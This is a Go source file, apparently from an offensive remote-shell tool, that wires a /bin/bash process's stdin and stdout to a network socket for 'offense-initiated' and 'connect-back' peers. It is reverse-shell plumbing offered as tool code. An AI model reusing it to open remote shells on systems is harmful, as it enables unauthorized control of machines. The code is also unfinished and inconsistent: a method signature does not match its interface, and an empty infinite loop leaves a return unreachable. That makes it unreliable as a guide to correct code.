/*
	This code is intentionally redundant.
	I'm trying to re-implement a similar logic as connection.go
	so I can do unit testing WITHOUT creating a real shell process.
	This is unfinished right now, but expect test methods/ structs
	which match the ones implemented below in a fasion similar to
	connection.go.
*/

package utils

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
)

// Interface used to blueprint the RealShell struct & eventually TestShell struct:
type BashShell interface {
	StartShell(*RealSocket) error
	PipeStdin() *io.WriteCloser
	PipeStdout() *io.ReadCloser
	PipeStderr() *io.ReadCloser
}

type ShellGetter interface {
	// Used to check the real (RealShellGetter) & test (TestShellGetter) structs:
	// GetOffenseInitiatedShell() BashShell // Return RealShell OR TestShell, blueprinted against BashShell interface: <-------- eventually this will be a thing
	GetConnectBackInitiatedShell(*Peer) BashShell
}

type RealShellGetter struct {
	// Leave empty
}

// Holds the REAL shell process/ Cmd struct (from exec pkg):
type RealShell struct {
	RrealShell *exec.Cmd
}

// Get shell for Offense-initiated peer:
// func (g RealShellGetter) GetOffenseInitiatedShell() BashShell {
//
// }

// Get shell for CB-initiated peer:
func (g RealShellGetter) GetConnectBackInitiatedShell() BashShell {
	// If bash exists on the system, find it, save the path:
	var pointerToShell *RealShell

	bashPath, err := exec.LookPath(`/bin/bash`) // bashPath @0xfaraday
	if err != nil {
		fmt.Printf("Error finding bash shell path (shell.go): %v\n", err)
		os.Stderr.WriteString(" " + err.Error() + "\n")
		os.Exit(1)
	}

	// Initiate bShell with the struct & process created by exec.Command:
	pointerToShell = &RealShell{RrealShell: exec.Command(bashPath)}

	// Get the pointer to the shell process and & return it:
	fmt.Printf("Address of shell in shell.go = %p\n", pointerToShell)
	return pointerToShell
}

// This essentially wraps the actual exec.Cmd.Start() method:
func (s *RealShell) StartShell(socketPointer *RealSocket) error {
	socket := *socketPointer

	fmt.Printf("addres of socket in shell.go: %p\n", socketPointer)

	// stderrReader, _ := s.RrealShell.StderrPipe()
	stdoutReader, _ := s.RrealShell.StdoutPipe()
	stdinWriter, _ := s.RrealShell.StdinPipe()

	socketWriter, _ := socket.RrealSocket.(io.Writer)
	socketReader, _ := socket.RrealSocket.(io.Reader)

	fmt.Printf("starting shell\n")
	// Start the shell:
	var erR error = s.RrealShell.Start()
	if erR == nil {
		// If no error, call wait (which is blocking):
		go func() {
			fmt.Println("calling wait")
			erR = s.RrealShell.Wait()
			fmt.Println("done with wait")
		}()
	}

	// Read stdout:
	go func(stdout io.ReadCloser, socket io.Writer) {
		_, err := io.Copy(socket, stdout)
		if err != nil {
			log.Fatalf("Error copying stdout to socket: %v\n", err)
		}
	}(stdoutReader, socketWriter)

	// Copy socket to stdin:
	go func(socket io.Reader, stdin io.WriteCloser) {
		_, err := io.Copy(stdin, socket)
		if err != nil {
			log.Fatalf("Error copying socket to stdin: %v\n", err)
		}
	}(socketReader, stdinWriter)

	//	For loop for stuff:
	for {

	}

	return erR
}

// Wrap the ACTUAL exec.Cmd.StdinPipe() method:
func (s *RealShell) PipeStdin() *io.WriteCloser {
	// Establish pipe to bash stdin:
	bashIn, eRr := s.RrealShell.StdinPipe()
	if eRr != nil {
		fmt.Printf("Error creating shell STDIN pipe (shell.go): %v\n", eRr)
		os.Stderr.WriteString(" " + eRr.Error() + "\n")
		os.Exit(1)
	}

	// Get pointer to stdin pipe writer & return it:
	//stdinWriter := bashIn.(io.Writer)
	var pointerToBashInWriter *io.WriteCloser = &bashIn
	fmt.Printf("Stdin address (shell.go) = %p\n", pointerToBashInWriter)
	return pointerToBashInWriter
}

// Wrap the ACTUAL exec.Cmd.StdoutPipe() method:
func (s *RealShell) PipeStdout() *io.ReadCloser {
	// Establish pipe to bash stdout:
	bashOut, erro := s.RrealShell.StdoutPipe()
	if erro != nil {
		fmt.Printf("Error creating shell STDOUT pipe (shell.go): %v\n", erro)
		os.Stderr.WriteString(" " + erro.Error() + "\n")
		os.Exit(1)
	}

	// Get pointer to stdout pipe & return it:
	var pointerToBashOut *io.ReadCloser = &bashOut
	fmt.Printf("Stdout address (shell.go) = %p\n", pointerToBashOut)
	return pointerToBashOut
}

// Wrap the ACTUAL exec.Cmd.StderrPipe() method:
func (s *RealShell) PipeStderr() *io.ReadCloser {
	// Establish pipe to bash stderr:
	bashErr, eRro := s.RrealShell.StderrPipe()
	if eRro != nil {
		fmt.Printf("Error creating shell STDERR pipe (shell.go): %v\n", eRro)
		os.Stderr.WriteString(" " + eRro.Error() + "\n")
		os.Exit(1)
	}

	// Get pointer to stderr pipe & return it:
	var pointerToBashErr *io.ReadCloser = &bashErr
	fmt.Printf("Stderr address (shell.go) = %p\n", pointerToBashErr)
	return pointerToBashErr
}
